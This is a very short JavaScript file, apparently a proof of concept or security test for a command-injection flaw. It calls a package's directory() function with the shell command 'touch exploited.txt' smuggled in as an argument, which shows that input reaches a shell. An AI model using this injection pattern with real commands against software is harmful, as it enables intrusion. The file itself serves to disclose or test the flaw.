'use strict'

const pkg = require('../src');
pkg.directory("./", ["touch exploited.txt"]);
